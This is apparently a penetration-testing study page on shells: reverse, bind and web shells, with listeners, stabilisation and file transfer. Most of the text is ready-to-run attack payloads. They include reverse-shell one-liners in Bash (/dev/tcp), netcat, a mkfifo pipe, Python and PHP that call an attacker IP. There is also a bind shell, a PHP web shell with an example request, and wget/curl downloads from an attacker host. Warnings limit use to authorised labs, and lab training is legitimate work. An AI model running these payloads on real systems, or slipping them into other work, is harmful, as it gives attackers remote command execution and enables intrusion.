# Shells

A shell is an interface used to interact with an operating system. In cybersecurity, the term usually refers to a command-line session on a local or remote machine.

In offensive security labs, getting a shell often means turning a vulnerability into interactive command execution.

!!! warning
    Use shell payloads only in authorized labs, CTFs, internal training environments, or approved assessments.

---

## Overview

A shell can allow a tester to run commands on a target system.

Common uses in labs:

- Confirm code execution
- Enumerate the system
- Read accessible files
- Check current user privileges
- Stabilize access
- Transfer files
- Prepare for privilege escalation
- Understand network position

A shell does **not** automatically mean full control. The access level depends on the user account and permissions of the process that spawned it.

Example:

```text
www-data -> low-privileged web server user
root     -> full Linux administrative control
SYSTEM   -> full Windows administrative control
```

---

## Shell Types

There are three common shell types to understand.

| Type | Description |
|---|---|
| Reverse shell | Target connects back to the attacker |
| Bind shell | Target opens a listening port |
| Web shell | Server-side script receives commands over HTTP |

---

## Reverse Shell

A reverse shell makes the target connect back to the attacker's machine.

```text
Target -> Attacker
```

This is common because many networks block inbound traffic but allow some outbound traffic.

### Attacker Listener

On the attacker's machine:

```bash
nc -lvnp 443
```

Flag breakdown:

| Flag | Meaning |
|---|---|
| `-l` | Listen mode |
| `-v` | Verbose output |
| `-n` | Do not resolve DNS |
| `-p` | Port to listen on |

Common listener ports in labs:

```text
443
4444
8080
9001
```

!!! note
    Choose ports based on the lab environment and what is allowed. Do not assume outbound traffic is unrestricted.

---

## Basic Reverse Shell Flow

1. Attacker starts a listener.
2. Target executes a reverse shell payload.
3. Target connects back to the attacker.
4. Attacker receives a command shell.

```text
Attacker: nc -lvnp 443
Target:   reverse shell payload connects to attacker:443
Result:   attacker receives shell
```

---

## Bash Reverse Shell

Bash reverse shell using `/dev/tcp`:

```bash
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```

Example:

```bash
bash -i >& /dev/tcp/10.10.14.5/443 0>&1
```

This redirects shell input, output, and error streams over a TCP connection.

!!! note
    `/dev/tcp` is a Bash feature. It may not work in every shell.

---

## Netcat Reverse Shell

Some versions of Netcat support `-e`.

```bash
nc <ATTACKER_IP> <PORT> -e /bin/sh
```

Example:

```bash
nc 10.10.14.5 443 -e /bin/sh
```

Many modern Netcat versions disable `-e`, so this may not work.

---

## Netcat Reverse Shell Without `-e`

Named pipe method:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <ATTACKER_IP> <PORT> >/tmp/f
```

Example:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.10.14.5 443 >/tmp/f
```

Breakdown:

| Part | Purpose |
|---|---|
| `rm -f /tmp/f` | Removes old pipe if it exists |
| `mkfifo /tmp/f` | Creates a named pipe |
| `cat /tmp/f` | Reads commands from the pipe |
| `sh -i 2>&1` | Starts interactive shell and redirects errors |
| `nc <IP> <PORT>` | Connects to listener |
| `>/tmp/f` | Sends received commands back into the pipe |

---

## Python Reverse Shell

Python reverse shell:

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<ATTACKER_IP>",<PORT>));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```

Example:

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.5",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```

This creates a socket, redirects standard input/output/error, and spawns Bash.

---

## PHP Reverse Shell Concept

PHP may be useful when exploiting a PHP web application.

Example one-liner:

```bash
php -r '$sock=fsockopen("<ATTACKER_IP>",<PORT>);exec("sh <&3 >&3 2>&3");'
```

Example:

```bash
php -r '$sock=fsockopen("10.10.14.5",443);exec("sh <&3 >&3 2>&3");'
```

PHP command execution functions that may appear in labs:

```text
exec()
system()
shell_exec()
passthru()
popen()
proc_open()
```

---

## Bind Shell

A bind shell makes the target listen on a port. The attacker then connects to that port.

```text
Attacker -> Target
```

This is less common because inbound firewall rules often block the connection.

### Target Listener

Executed on the target in a lab:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

### Attacker Connects

```bash
nc -nv <TARGET_IP> 8080
```

---

## Reverse vs Bind Shells

| Feature | Reverse Shell | Bind Shell |
|---|---|---|
| Connection direction | Target to attacker | Attacker to target |
| Listener location | Attacker machine | Target machine |
| Firewall challenge | Outbound filtering | Inbound filtering |
| Common in labs | Very common | Less common |
| Detection clue | Outbound connection | New listening port |

---

## Web Shell

A web shell is a server-side script that accepts commands through HTTP requests.

It is often used when a file upload, command injection, or file write vulnerability allows code to be placed on the web server.

Example PHP web shell:

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Example request:

```http
GET /uploads/shell.php?cmd=whoami HTTP/1.1
Host: vulnerable.example
```

!!! danger
    Web shells can provide command execution through the web server process. Use only in authorized lab environments.

---

## Web Shell vs Reverse Shell

| Feature | Web Shell | Reverse Shell |
|---|---|---|
| Interaction | HTTP requests | Interactive network connection |
| Connection | Attacker requests shell URL | Target connects back |
| Stability | Often stable but limited | More interactive |
| Detection | Suspicious uploaded script | Suspicious outbound connection |
| Common use | File upload / RCE labs | Exploit callback |

---

## Listeners

A listener waits for incoming reverse shell connections.

### Netcat

```bash
nc -lvnp 443
```

### rlwrap + Netcat

`rlwrap` improves usability by adding command history and arrow-key support.

```bash
rlwrap nc -lvnp 443
```

### Ncat

Ncat is the Nmap project's improved Netcat.

```bash
ncat -lvnp 4444
```

Ncat can also support SSL:

```bash
ncat --ssl -lvnp 4444
```

### Socat

Socat is powerful for more advanced shell handling.

```bash
socat -d -d TCP-LISTEN:443 STDOUT
```

---

## Listener Comparison

| Tool | Main Benefit |
|---|---|
| `nc` | Simple and widely available |
| `rlwrap nc` | Better input handling |
| `ncat` | Modern features and SSL support |
| `socat` | Flexible and useful for TTY upgrades |

---

## Shell Stabilization

Basic reverse shells are often unstable.

Common issues:

- No command history
- Arrow keys do not work
- Ctrl+C kills the shell
- No tab completion
- No proper TTY
- Interactive programs behave poorly

### Python PTY Upgrade

Inside the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then background the shell with:

```text
Ctrl+Z
```

On the attacker machine:

```bash
stty raw -echo; fg
```

Then press Enter and run:

```bash
export TERM=xterm
stty rows 40 cols 120
```

!!! note
    Shell stabilization steps may vary depending on terminal, OS, and shell type.

---

## Useful First Commands

After receiving a shell in a lab, gather basic context.

### Linux

```bash
whoami
id
hostname
pwd
uname -a
ip addr
ip route
ls -la
```

### Windows

```cmd
whoami
hostname
ipconfig
route print
dir
systeminfo
```

---

## Privilege Context

Always identify what user the shell is running as.

Linux examples:

```bash
whoami
id
```

Windows examples:

```cmd
whoami
whoami /priv
whoami /groups
```

The current user determines what actions are possible.

---

## File Transfer Basics

In labs, you may need to transfer tools or files.

### Python HTTP Server

On attacker machine:

```bash
python3 -m http.server 8000
```

On target:

```bash
wget http://<ATTACKER_IP>:8000/file
curl -O http://<ATTACKER_IP>:8000/file
```

### Netcat File Transfer

Receiver:

```bash
nc -lvnp 9001 > file.out
```

Sender:

```bash
nc <IP> 9001 < file.in
```

---

## Operational Safety

Good habits in labs and assessments:

- Confirm authorization and scope.
- Avoid destructive commands.
- Do not modify data unless required and approved.
- Record commands used.
- Capture evidence carefully.
- Avoid unnecessary persistence.
- Prefer proof-of-concept impact over excessive access.
- Clean up lab artifacts when instructed.

---

## Common Troubleshooting

| Problem | Possible Cause |
|---|---|
| No callback | Wrong IP, wrong port, firewall, payload failed |
| Connection closes immediately | Shell binary missing, command error, process exits |
| No output | Incorrect redirection |
| `python` not found | Try `python3` |
| `nc -e` fails | Netcat version does not support `-e` |
| Shell is unstable | Upgrade PTY or use rlwrap/socat |
| Cannot reach attacker | VPN interface/IP issue |

Check your VPN/interface IP:

```bash
ip addr
```

Check listener:

```bash
ss -tulpn | grep 443
```

---

## Quick Reference

| Goal | Command |
|---|---|
| Netcat listener | `nc -lvnp 443` |
| rlwrap listener | `rlwrap nc -lvnp 443` |
| Bash reverse shell | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| Python PTY upgrade | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
| Bind shell connect | `nc -nv TARGET_IP PORT` |
| Start HTTP server | `python3 -m http.server 8000` |
| Download with wget | `wget http://IP:8000/file` |
| Current Linux user | `id` |
| Current Windows user | `whoami /priv` |

---

## Notes to Remember

- A shell is a command-line control channel.
- Reverse shells connect from target to attacker.
- Bind shells listen on the target.
- Web shells receive commands over HTTP.
- Reverse shells are usually more common in labs.
- Basic shells often need stabilization.
- Always check current user and system context.
- Shell access should be handled carefully and documented.